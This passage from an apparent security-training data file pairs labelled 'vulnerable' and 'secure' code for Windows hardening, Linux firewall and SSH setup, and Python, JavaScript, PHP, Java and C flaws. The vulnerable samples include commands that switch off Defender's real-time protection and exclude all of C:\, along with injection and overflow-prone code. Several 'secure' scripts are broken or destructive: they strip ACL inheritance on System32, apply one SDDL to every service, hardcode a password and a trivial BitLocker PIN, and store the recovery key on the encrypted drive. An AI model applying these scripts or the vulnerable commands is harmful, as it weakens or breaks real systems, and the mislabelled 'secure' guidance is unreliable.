# Increase Security log size and set to Archive mode
wevtutil sl Security /ms:1073741824  # 1GB size
wevtutil sl Security /rt:false       # Disable overwrite (archive mode)

# Configure System and Application logs similarly
wevtutil sl System /ms:536870912     # 512MB
wevtutil sl Application /ms:536870912

# Enable PowerShell logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v "EnableModuleLogging" /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 1 /f

# Query security events for monitoring
# Failed logon attempts (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddDays(-1)}

# Successful privileged logons (Event ID 4624 with LogonType 10)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Message -like "*Logon Type:*10*"}

# Process creation events (Event ID 4688)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688; StartTime=(Get-Date).AddHours(-24)}`,
              explanation: "Enhanced logging configuration provides sufficient storage and retention for security analysis. Comprehensive event monitoring enables detection of suspicious activities and supports forensic investigations."
            },
            prevention: [
              "Configure log files with adequate size (minimum 1GB for Security log)",
              "Use Archive mode instead of Circular to preserve historical events",
              "Enable advanced auditing for process creation and privilege use",
              "Implement centralized log collection with SIEM integration",
              "Regular monitoring and analysis of security-relevant event IDs"
            ]
          }
        },
        {
          id: "registry-security-hardening",
          title: "Windows Registry Security and Hardening",
          type: "practical",
          content: {
            theory: "The Windows Registry is a hierarchical database that stores configuration settings for the operating system and applications. It contains critical security settings that control system behavior, user privileges, and security policies. Proper registry hardening involves configuring security-related registry keys to enhance system protection while understanding the risks of registry modifications and maintaining system stability.",
            vulnerability: {
              code: `# VULNERABLE - Default registry settings with security weaknesses
# Check for anonymous access permissions (security risk)
reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous"

# Default: RestrictAnonymous = 0 (allows anonymous connections)

# LM Hash storage enabled (weak authentication)
reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash"

# SMB1 protocol enabled (vulnerable to attacks)
reg query "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v "SMB1"

# No UAC for built-in Administrator account
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "FilterAdministratorToken"`,
              explanation: "Default registry settings often prioritize compatibility over security. Anonymous access, weak authentication protocols, and legacy features create potential attack vectors that should be addressed through proper registry hardening."
            },
            secure: {
              code: `# SECURE - Registry hardening for enhanced security
# Restrict anonymous access to system information
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous" /t REG_DWORD /d 1 /f
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymousSAM" /t REG_DWORD /d 1 /f

# Disable LM Hash storage (force stronger authentication)
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash" /t REG_DWORD /d 1 /f

# Disable SMB1 protocol (prevent SMB1-based attacks)
reg add "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v "SMB1" /t REG_DWORD /d 0 /f

# Enable UAC for built-in Administrator account
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f

# Disable AutoRun for all drives (prevent malware execution)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoDriveTypeAutoRun" /t REG_DWORD /d 255 /f

# Create registry backup before making changes
reg export HKLM\\System\\CurrentControlSet\\Control\\Lsa lsa_backup.reg`,
              explanation: "Comprehensive registry hardening addresses multiple attack vectors including anonymous access, weak authentication, legacy protocols, and autorun vulnerabilities while maintaining system functionality."
            },
            prevention: [
              "Always create registry backups before making security changes",
              "Test registry modifications in non-production environments first",
              "Use Group Policy for enterprise-wide registry security settings",
              "Regular audit of security-related registry keys",
              "Document all registry changes for compliance and troubleshooting"
            ]
          }
        },
        {
          id: "windows-defender-configuration",
          title: "Windows Defender Antivirus Advanced Configuration",
          type: "practical",
          content: {
            theory: "Windows Defender Antivirus is Microsoft's built-in endpoint protection platform that provides real-time protection against malware, viruses, and other threats. Advanced configuration involves optimizing scan settings, exclusions management, cloud protection features, and integration with enterprise security tools. Understanding these configurations is essential for maintaining effective endpoint protection while minimizing performance impact on business operations.",
            vulnerability: {
              code: `# VULNERABLE - Windows Defender disabled or poorly configured
# Check if Windows Defender is disabled
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled

# Common misconfigurations:
# Real-time protection disabled
Set-MpPreference -DisableRealtimeMonitoring $true

# Cloud protection disabled (reduces detection capabilities)
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

# Excessive exclusions (creates security gaps)
Add-MpPreference -ExclusionPath "C:\\"
Add-MpPreference -ExclusionExtension ".exe"`,
              explanation: "Disabling Windows Defender or misconfiguring its settings significantly reduces endpoint protection. Excessive exclusions and disabled cloud protection create security gaps that malware can exploit."
            },
            secure: {
              code: `# SECURE - Optimized Windows Defender configuration
# Enable all protection features
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false

# Configure cloud protection for enhanced detection
Set-MpPreference -MAPSReporting Advanced
Set-MpPreference -SubmitSamplesConsent SendSafeSamples

# Configure scan settings
Set-MpPreference -ScanAvgCPULoadFactor 50
Set-MpPreference -ScanOnlyIfIdleEnabled $true

# Set up scheduled scans
$trigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 2AM
$action = New-ScheduledTaskAction -Execute "MpCmdRun.exe" -Argument "-Scan -ScanType 2"
Register-ScheduledTask -TaskName "Weekly Full Scan" -Trigger $trigger -Action $action

# Monitor threat detection
Get-MpThreatDetection | Select-Object ThreatID, ThreatName, ActionTaken, InitialDetectionTime

# Configure specific exclusions only when necessary (minimize)
Add-MpPreference -ExclusionPath "C:\\TrustedApp\\logs"  # Only specific paths
Add-MpPreference -ExclusionProcess "trustedapp.exe"    # Only specific processes`,
              explanation: "Properly configured Windows Defender provides comprehensive protection with cloud-enhanced detection, appropriate scanning schedules, and minimal necessary exclusions."
            },
            prevention: [
              "Maintain real-time protection and behavior monitoring enabled",
              "Enable cloud protection for advanced threat intelligence",
              "Implement minimal and specific exclusions only when required",
              "Regular review and removal of unnecessary exclusions",
              "Monitor threat detection logs and respond to alerts promptly"
            ]
          }
        },
        {
          id: "service-hardening-windows",
          title: "Windows Service Security and Hardening",
          type: "practical",
          content: {
            theory: "Windows Services are background processes that run independently of user sessions and provide essential system functionality. Service hardening involves identifying unnecessary services, configuring appropriate service accounts, setting proper permissions, and monitoring service behavior. Attackers often target services for privilege escalation, persistence, and lateral movement, making service security a critical component of Windows hardening.",
            vulnerability: {
              code: `# VULNERABLE - Services running with excessive privileges
# Check services running as SYSTEM (potential security risk)
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, State, StartName

# Unnecessary services enabled (increasing attack surface)
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.Name -like "*Telnet*"}
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.Name -like "*FTP*"}

# Services with weak permissions
# Example: Service allows modification by non-administrative users
sc sdshow "VulnerableService"

# No monitoring of service changes
# Services can be modified without detection`,
              explanation: "Services running with excessive privileges, unnecessary services, and weak service permissions create attack vectors. Attackers can exploit these vulnerabilities for privilege escalation and system compromise."
            },
            secure: {
              code: `# SECURE - Comprehensive service hardening approach
# Identify and disable unnecessary services
$unnecessaryServices = @("Telnet", "FTPSVC", "SNMPTRAP", "RemoteRegistry")
foreach ($service in $unnecessaryServices) {
    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
        Stop-Service -Name $service -Force
        Set-Service -Name $service -StartupType Disabled
        Write-Host "Disabled service: $service"
    }
}

# Configure services to run with minimal required privileges
# Example: Configure a service to run as Network Service instead of Local System
sc config "ServiceName" obj= "NT AUTHORITY\\NetworkService"

# Create dedicated service accounts for critical services
$serviceAccount = "ServiceAccount"
$password = ConvertTo-SecureString "ComplexP@ssw0rd123!" -AsPlainText -Force
New-LocalUser -Name $serviceAccount -Password $password -Description "Dedicated service account"

# Grant minimal required rights to service account
$userRight = "SeServiceLogonRight"
$userName = $serviceAccount
Grant-UserRight -Account $userName -Right $userRight

# Monitor service changes with Event Log
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# Regular service audit
Get-Service | Where-Object {$_.Status -eq "Running"} | 
    Select-Object Name, StartType, @{Name="Account";Expression={(Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'").StartName}} |
    Export-Csv -Path "C:\\Temp\\RunningServices.csv" -NoTypeInformation`,
              explanation: "Comprehensive service hardening includes disabling unnecessary services, using dedicated service accounts with minimal privileges, and implementing monitoring for service changes."
            },
            prevention: [
              "Regular audit of running services and disable unnecessary ones",
              "Use dedicated service accounts instead of built-in high-privilege accounts",
              "Implement principle of least privilege for service permissions",
              "Monitor service configuration changes through Event Logs",
              "Establish service baseline and alert on unauthorized modifications"
            ]
          }
        },
        {
          id: "bitlocker-drive-encryption",
          title: "BitLocker Drive Encryption Implementation",
          type: "practical",
          content: {
            theory: "BitLocker Drive Encryption is Microsoft's full disk encryption feature that protects data by encrypting entire volumes and requiring authentication before the operating system boots or the volume is accessed. BitLocker helps protect against data theft or exposure from lost, stolen, or inappropriately decommissioned devices. Understanding proper BitLocker implementation, key management, and recovery procedures is essential for data protection in enterprise environments.",
            vulnerability: {
              code: `# VULNERABLE - Unencrypted drives and poor BitLocker configuration
# Check if BitLocker is enabled (showing unprotected drives)
Get-BitLockerVolume

# Example output showing unprotected drives:
# VolumeType: OperatingSystem, EncryptionPercentage: 0, VolumeStatus: FullyDecrypted

# BitLocker enabled but with weak authentication
# TPM-only protection (vulnerable to physical attacks)
Enable-BitLocker -MountPoint "C:" -TpmProtector

# No backup of recovery keys
# Recovery key stored locally only (single point of failure)

# BitLocker suspended or disabled
Suspend-BitLocker -MountPoint "C:" -RebootCount 0`,
              explanation: "Unencrypted drives expose data to theft if devices are lost or stolen. Weak BitLocker configurations with TPM-only protection and no recovery key backup create security and availability risks."
            },
            secure: {
              code: `# SECURE - Comprehensive BitLocker deployment with strong security
# Check TPM status and prepare for BitLocker
Get-Tpm
Initialize-Tpm

# Enable BitLocker with PIN + TPM for enhanced security
$Pin = ConvertTo-SecureString "1234567890" -AsPlainText -Force
Enable-BitLocker -MountPoint "C:" -TpmAndPinProtector -Pin $Pin

# Backup recovery key to Active Directory (enterprise environment)
Enable-BitLocker -MountPoint "C:" -RecoveryPasswordProtector
$RecoveryKey = (Get-BitLockerVolume -MountPoint "C:").KeyProtector | Where-Object {$_.KeyProtectorType -eq "RecoveryPassword"}
Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $RecoveryKey.KeyProtectorId

# Export recovery key to secure location
$RecoveryPassword = (Get-BitLockerVolume -MountPoint "C:").KeyProtector | Where-Object {$_.KeyProtectorType -eq "RecoveryPassword"}
$RecoveryPassword.RecoveryPassword | Out-File -FilePath "C:\\SecureLocation\\BitLocker-Recovery.txt"

# Configure BitLocker Group Policy settings
# Computer Configuration > Policies > Administrative Templates > Windows Components > BitLocker Drive Encryption

# Monitor BitLocker status
Get-BitLockerVolume | Select-Object MountPoint, VolumeType, EncryptionPercentage, VolumeStatus, ProtectionStatus

# Set up automated BitLocker monitoring
$scriptBlock = {
    $volumes = Get-BitLockerVolume
    foreach ($volume in $volumes) {
        if ($volume.ProtectionStatus -ne "On") {
            Write-EventLog -LogName Application -Source "BitLocker Monitor" -EventId 1001 -EntryType Warning -Message "BitLocker protection disabled on $($volume.MountPoint)"
        }
    }
}
Register-ScheduledJob -Name "BitLocker Monitor" -ScriptBlock $scriptBlock -Trigger (New-JobTrigger -Daily -At 9AM)`,
              explanation: "Secure BitLocker implementation uses multi-factor authentication (TPM + PIN), proper recovery key management with backups, and continuous monitoring of encryption status."
            },
            prevention: [
              "Enable BitLocker on all drives containing sensitive data",
              "Use multi-factor authentication (TPM + PIN or TPM + USB key)",
              "Implement centralized recovery key backup to Active Directory",
              "Regular monitoring of BitLocker status and protection state",
              "Establish BitLocker policies through Group Policy for consistency"
            ]
          }
        },
        {
          id: "windows-update-security",
          title: "Windows Update Security Management",
          type: "practical",
          content: {
            theory: "Windows Update is the mechanism through which Microsoft delivers security patches, feature updates, and other improvements to Windows systems. Proper update management is critical for maintaining system security, as many cyberattacks exploit known vulnerabilities that have available patches. Understanding Windows Update configuration, testing procedures, and deployment strategies helps organizations maintain security while ensuring system stability and business continuity.",
            vulnerability: {
              code: `# VULNERABLE - Automatic updates disabled or poorly managed
# Check Windows Update service status (should be running)
Get-Service -Name wuauserv | Select-Object Name, Status, StartType

# Windows Update disabled
Set-Service -Name wuauserv -StartupType Disabled
Stop-Service -Name wuauserv -Force

# No update policy configured
Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" -ErrorAction SilentlyContinue

# Check for pending updates (showing many critical updates)
Get-WUList | Where-Object {$_.Title -like "*Security*"}

# No testing environment for updates
# Updates applied directly to production systems`,
              explanation: "Disabled Windows Updates leave systems vulnerable to known exploits. Lack of update management policies and testing procedures can lead to security gaps or system instability."
            },
            secure: {
              code: `# SECURE - Comprehensive Windows Update management strategy
# Ensure Windows Update service is configured properly
Set-Service -Name wuauserv -StartupType Automatic
Start-Service -Name wuauserv

# Configure Windows Update policy via registry (for domain environments, use Group Policy)
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "AUOptions" /t REG_DWORD /d 3 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "ScheduledInstallDay" /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "ScheduledInstallTime" /t REG_DWORD /d 3 /f

# Install PowerShell module for update management
Install-Module PSWindowsUpdate -Force

# Check for and install critical security updates
Get-WUList | Where-Object {$_.Title -like "*Security*" -or $_.Title -like "*Critical*"}
Get-WUInstall -KBArticleID "KB1234567" -AcceptAll -AutoReboot

# Configure update exclusions carefully (only when absolutely necessary)
# Hide specific updates that cause issues
Hide-WUUpdate -KBArticleID "KB1234567" -Title "Problematic Update"

# Create update installation script with error handling
$Updates = Get-WUList | Where-Object {$_.MsrcSeverity -eq "Critical"}
foreach ($Update in $Updates) {
    try {
        Get-WUInstall -KBArticleID $Update.KB -AcceptAll -IgnoreReboot
        Write-Host "Successfully installed: $($Update.Title)"
    } catch {
        Write-Error "Failed to install: $($Update.Title) - Error: $($_.Exception.Message)"
    }
}

# Monitor update history and status
Get-WUHistory | Where-Object {$_.Date -gt (Get-Date).AddDays(-30)} | Select-Object Date, Title, Result
Get-WURebootStatus`,
              explanation: "Proper Windows Update management includes automated update policies, selective installation of critical updates, proper testing procedures, and comprehensive monitoring and reporting."
            },
            prevention: [
              "Enable automatic installation of critical security updates",
              "Establish testing environment for update validation",
              "Configure maintenance windows for update installation",
              "Regular monitoring of update installation status and failures",
              "Implement Windows Server Update Services (WSUS) for enterprise control"
            ]
          }
        },
        {
          id: "windows-privilege-escalation-prevention",
          title: "Windows Privilege Escalation Prevention",
          type: "practical",
          content: {
            theory: "Privilege escalation occurs when an attacker gains elevated access rights beyond their initial level of authorization. In Windows environments, this often involves exploiting misconfigurations, weak service permissions, unpatched vulnerabilities, or insecure file/registry permissions. Understanding common privilege escalation vectors and implementing appropriate preventive measures is crucial for maintaining the principle of least privilege and protecting against advanced persistent threats.",
            vulnerability: {
              code: `# VULNERABLE - Common privilege escalation vulnerabilities
# Check for services with weak permissions (exploitable by non-admin users)
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $serviceName = $_.Name
    $acl = (Get-Acl -Path "HKLM:\\System\\CurrentControlSet\\Services\\$serviceName").Access
    $acl | Where-Object {$_.IdentityReference -like "*Users*" -and $_.AccessControlType -eq "Allow"}
}

# Unquoted service paths (DLL hijacking vulnerability)
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | Select-Object Name, PathName

# Check for writable directories in system PATH
$env:PATH -split ';' | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl -Path $_
        $acl.Access | Where-Object {$_.IdentityReference -like "*Users*" -and $_.FileSystemRights -like "*Write*"}
    }
}

# AlwaysInstallElevated vulnerability (MSI packages run as SYSTEM)
$regPaths = @(
    "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
)
foreach ($path in $regPaths) {
    Get-ItemProperty -Path $path -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
}`,
              explanation: "Common privilege escalation vulnerabilities include weak service permissions, unquoted service paths, writable system directories, and dangerous registry settings that allow standard users to gain administrative privileges."
            },
            secure: {
              code: `# SECURE - Comprehensive privilege escalation prevention
# Fix unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | ForEach-Object {
    $serviceName = $_.Name
    $currentPath = $_.PathName
    $quotedPath = '"' + $currentPath + '"'
    sc config $serviceName binPath= $quotedPath
    Write-Host "Fixed unquoted path for service: $serviceName"
}

# Secure service permissions (remove excessive permissions for Users group)
$services = Get-WmiObject -Class Win32_Service
foreach ($service in $services) {
    $serviceName = $service.Name
    # Use sc.exe to set secure permissions (only Administrators and SYSTEM)
    sc sdset $serviceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
}

# Secure system directory permissions
$systemDirs = @("C:\\Windows\\System32", "C:\\Windows\\SysWOW64", "C:\\Program Files", "C:\\Program Files (x86)")
foreach ($dir in $systemDirs) {
    if (Test-Path $dir) {
        $acl = Get-Acl -Path $dir
        # Remove write permissions for Users group
        $acl.SetAccessRuleProtection($true, $false)
        $acl.SetAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $dir -AclObject $acl
    }
}

# Disable AlwaysInstallElevated if enabled
$regPaths = @(
    "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
    "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
)
foreach ($path in $regPaths) {
    if (Test-Path $path) {
        Set-ItemProperty -Path $path -Name "AlwaysInstallElevated" -Value 0 -Force
    }
}

# Enable additional security measures
# Disable cached credentials
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "CachedLogonsCount" /t REG_SZ /d "0" /f

# Configure User Account Control for maximum security
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 2 /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 3 /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableInstallerDetection" /t REG_DWORD /d 1 /f

# Regular privilege escalation vulnerability assessment
Write-Host "Running privilege escalation vulnerability check..."
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Measure-Object | Select-Object Count`,
              explanation: "Comprehensive privilege escalation prevention involves fixing service vulnerabilities, securing file/registry permissions, disabling dangerous features, and implementing continuous monitoring."
            },
            prevention: [
              "Regular audit of service permissions and fix weak configurations",
              "Implement principle of least privilege for all user accounts",
              "Keep systems updated with latest security patches",
              "Use User Account Control (UAC) with highest security settings",
              "Regular vulnerability assessments focusing on privilege escalation vectors"
            ]
          }
        }
      ]
    },
    "network-security": {
      title: "Network Security Fundamentals",
      description: "Essential network security concepts and practices",
      progress: 0,
      totalLessons: 14,
      sections: [
        {
          id: "firewall-configuration",
          title: "Firewall Configuration and Management",
          type: "practical",
          content: {
            theory: "Firewalls act as a barrier between trusted internal networks and untrusted external networks, controlling traffic based on predetermined rules.",
            vulnerability: {
              code: `# VULNERABLE - Overly permissive firewall rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F

# Allow everything
iptables -A INPUT -j ACCEPT`,
              explanation: "Accepting all traffic by default leaves the system exposed to various network-based attacks."
            },
            secure: {
              code: `# SECURE - Restrictive firewall configuration
# Default policy: deny all
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow specific services only
iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH
iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT # HTTPS`,
              explanation: "Default-deny policy with explicit rules for required services minimizes attack surface."
            },
            prevention: [
              "Implement default-deny firewall policies",
              "Regularly audit and update firewall rules",
              "Use intrusion detection systems (IDS)",
              "Monitor network traffic for anomalies"
            ]
          }
        }
      ]
    },
    "system-hardening": {
      title: "System Hardening Techniques",
      description: "Comprehensive system hardening strategies for enhanced security",
      progress: 0,
      totalLessons: 16,
      sections: [
        {
          id: "service-hardening",
          title: "Service and Process Hardening",
          type: "practical",
          content: {
            theory: "System hardening involves disabling unnecessary services, securing configurations, and implementing security controls to reduce attack surface.",
            vulnerability: {
              code: `# VULNERABLE - Default service configuration
# SSH with default settings
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes

# Multiple unnecessary services running
systemctl status telnet
systemctl status ftp
systemctl status rsh`,
              explanation: "Default configurations often prioritize functionality over security, leaving systems vulnerable."
            },
            secure: {
              code: `# SECURE - Hardened SSH configuration
Port 2222                    # Non-standard port
PermitRootLogin no          # Disable root login
PasswordAuthentication no   # Key-based auth only
AllowUsers specificuser     # Limit user access
MaxAuthTries 3             # Limit login attempts

# Disable unnecessary services
systemctl disable telnet
systemctl disable rsh
systemctl stop unnecessary-services`,
              explanation: "Hardened configurations reduce attack vectors and implement security best practices."
            },
            prevention: [
              "Disable unnecessary services and ports",
              "Implement strong authentication mechanisms",
              "Regular security updates and patches",
              "Use security frameworks (CIS benchmarks)"
            ]
          }
        }
      ]
    }
  },
  "programming-security": {
    "python-security": {
      title: "Secure Python Development",
      description: "Security best practices for Python applications",
      progress: 0,
      totalLessons: 20,
      sections: [
        {
          id: "input-sanitization",
          title: "Input Sanitization in Python",
          type: "practical",
          content: {
            theory: "Proper input validation and sanitization are crucial to prevent injection attacks in Python applications.",
            vulnerability: {
              code: `# VULNERABLE - Command injection
import os
user_input = input("Enter filename: ")
os.system(f"cat {user_input}")`,
              explanation: "Direct execution of user input can lead to command injection attacks."
            },
            secure: {
              code: `# SECURE - Proper input validation
import os
import re
user_input = input("Enter filename: ")
if re.match(r'^[a-zA-Z0-9._-]+$', user_input):
    with open(user_input, 'r') as f:
        print(f.read())
else:
    print("Invalid filename")`,
              explanation: "Input validation and safe file operations prevent injection attacks."
            },
            prevention: [
              "Validate all input against expected patterns",
              "Use parameterized queries for database operations",
              "Avoid direct system command execution",
              "Implement proper error handling"
            ]
          }
        }
      ]
    },
    "javascript-security": {
      title: "Secure JavaScript/Node.js Development",
      description: "Security practices for JavaScript and Node.js applications",
      progress: 0,
      totalLessons: 18,
      sections: [
        {
          id: "xss-prevention",
          title: "XSS Prevention in JavaScript",
          type: "practical",
          content: {
            theory: "Cross-Site Scripting (XSS) vulnerabilities occur when user input is directly inserted into the DOM without proper sanitization.",
            vulnerability: {
              code: `// VULNERABLE - Direct DOM manipulation
function displayMessage(message) {
    document.getElementById('output').innerHTML = message;
}`,
              explanation: "Directly setting innerHTML with user input can execute malicious scripts."
            },
            secure: {
              code: `// SECURE - Safe DOM manipulation
function displayMessage(message) {
    const element = document.getElementById('output');
    element.textContent = message; // Safe text insertion
    // Or use DOMPurify for HTML sanitization
    // element.innerHTML = DOMPurify.sanitize(message);
}`,
              explanation: "Using textContent or proper sanitization prevents XSS attacks."
            },
            prevention: [
              "Use textContent instead of innerHTML when possible",
              "Implement Content Security Policy (CSP)",
              "Sanitize HTML input with trusted libraries",
              "Validate and encode output appropriately"
            ]
          }
        }
      ]
    },
    "php-security": {
      title: "Secure PHP Development",
      description: "Security best practices for PHP web applications",
      progress: 0,
      totalLessons: 16,
      sections: [
        {
          id: "file-upload-security",
          title: "Secure File Upload Implementation",
          type: "practical",
          content: {
            theory: "File upload functionality can be exploited to upload malicious files, leading to code execution and system compromise.",
            vulnerability: {
              code: `<?php
// VULNERABLE - No file validation
if (isset($_FILES['upload'])) {
    $target = "uploads/" . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "File uploaded successfully!";
}
?>`,
              explanation: "Accepting any file type without validation allows attackers to upload malicious scripts."
            },
            secure: {
              code: `<?php
// SECURE - Proper file validation
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$maxSize = 5 * 1024 * 1024; // 5MB

if (isset($_FILES['upload'])) {
    $file = $_FILES['upload'];
    
    // Validate file type
    if (!in_array($file['type'], $allowedTypes)) {
        die('Invalid file type');
    }
    
    // Validate file size
    if ($file['size'] > $maxSize) {
        die('File too large');
    }
    
    // Generate safe filename
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $filename = uniqid() . '.' . $extension;
    $target = "uploads/" . $filename;
    
    move_uploaded_file($file['tmp_name'], $target);
}
?>`,
              explanation: "Proper validation and secure filename generation prevent malicious file uploads."
            },
            prevention: [
              "Validate file types and extensions",
              "Implement file size limits",
              "Generate secure filenames",
              "Store uploads outside web root"
            ]
          }
        }
      ]
    },
    "java-security": {
      title: "Secure Java Development",
      description: "Security practices for Java enterprise applications",
      progress: 0,
      totalLessons: 22,
      sections: [
        {
          id: "deserialization-security",
          title: "Secure Object Deserialization",
          type: "practical",
          content: {
            theory: "Unsafe deserialization can lead to remote code execution when untrusted data is deserialized without proper validation.",
            vulnerability: {
              code: `// VULNERABLE - Unsafe deserialization
import java.io.*;

public class UnsafeDeserializer {
    public Object deserialize(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data)
            );
            return ois.readObject(); // Dangerous!
        } catch (Exception e) {
            return null;
        }
    }
}`,
              explanation: "Deserializing untrusted data can execute malicious code through specially crafted objects."
            },
            secure: {
              code: `// SECURE - Safe deserialization with validation
import java.io.*;
import java.util.Set;

public class SecureDeserializer {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.SafeClass",
        "com.example.TrustedClass"
    );
    
    public Object deserialize(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data)
            ) {
                @Override
                protected Class<?> resolveClass(ObjectStreamClass desc)
                        throws IOException, ClassNotFoundException {
                    if (!ALLOWED_CLASSES.contains(desc.getName())) {
                        throw new SecurityException("Unauthorized class: " + desc.getName());
                    }
                    return super.resolveClass(desc);
                }
            };
            return ois.readObject();
        } catch (Exception e) {
            throw new SecurityException("Deserialization failed", e);
        }
    }
}`,
              explanation: "Whitelist-based validation ensures only trusted classes can be deserialized."
            },
            prevention: [
              "Validate deserialized classes against whitelist",
              "Use JSON or XML instead of native serialization",
              "Implement integrity checks on serialized data",
              "Avoid deserializing untrusted data"
            ]
          }
        }
      ]
    },
    "c-cpp-security": {
      title: "Secure C/C++ Development",
      description: "Memory safety and security practices for C/C++ applications",
      progress: 0,
      totalLessons: 18,
      sections: [
        {
          id: "buffer-overflow-prevention",
          title: "Buffer Overflow Prevention",
          type: "practical",
          content: {
            theory: "Buffer overflows occur when programs write data beyond the boundaries of allocated memory, potentially leading to code execution.",
            vulnerability: {
              code: `// VULNERABLE - Buffer overflow risk
#include <stdio.h>
#include <string.h>

void vulnerable_function(char* input) {
    char buffer[64];
    strcpy(buffer, input); // Dangerous!
    printf("Input: %s\\n", buffer);
}

int main() {
    char user_input[1000];
    gets(user_input); // Also dangerous!
    vulnerable_function(user_input);
    return 0;
}`,
              explanation: "Using unsafe functions like strcpy() and gets() can cause buffer overflows with malicious input."
            },
            secure: {
              code: `// SECURE - Buffer overflow prevention
#include <stdio.h>
#include <string.h>

void secure_function(const char* input) {
    char buffer[64];
    
    // Use safe string functions
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0'; // Ensure null termination
    
    printf("Input: %s\\n", buffer);
}

int main() {
    char user_input[1000];
    
    // Use safe input function
    if (fgets(user_input, sizeof(user_input), stdin) != NULL) {
        // Remove newline if present
        user_input[strcspn(user_input, "\\n")] = '\\0';
        secure_function(user_input);
    }
    
    return 0;
}`,
              explanation: "Using secure functions with bounds checking prevents buffer overflows."
            },
            prevention: [
              "Use safe string functions (strncpy, snprintf)",
